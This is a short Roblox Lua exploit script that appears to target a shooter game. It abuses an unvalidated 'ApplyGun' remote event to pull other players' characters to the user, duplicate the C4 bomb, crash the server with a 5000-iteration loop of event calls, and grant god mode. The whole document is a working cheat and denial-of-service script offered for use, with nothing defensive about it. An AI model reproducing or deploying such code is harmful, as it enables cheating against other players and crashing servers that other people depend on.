local plr = game:GetService("Players").THEIRUSERNAMEHERENOTDISPLAYNAME
game:GetService("ReplicatedStorage").Events.ApplyGun:FireServer({Model = plr.Character.Gun,Name = "USP"}, game.Players.LocalPlayer) -- bring people to you

game:GetService("ReplicatedStorage").Events.ApplyGun:FireServer({Model = game:GetService("Workspace"):FindFirstChild("C4"),Name = "USP"}, game.Players.LocalPlayer) -- duplicate bomb

if game:GetService("Workspace"):FindFirstChild("C4") then -- crash the server bomb must be planted
   for i = 0,5000 do
       game:GetService("ReplicatedStorage").Events.ApplyGun:FireServer({Model = game:GetService("Workspace"):FindFirstChild("C4"),Name = "USP"}, game.Players.LocalPlayer)
       wait()
   end
end

game:GetService("ReplicatedStorage").Events.ApplyGun:FireServer({Model = game:GetService("ReplicatedStorage").Hostage,Name = "USP"}, game.Players.LocalPlayer) -- godmode you can shoot people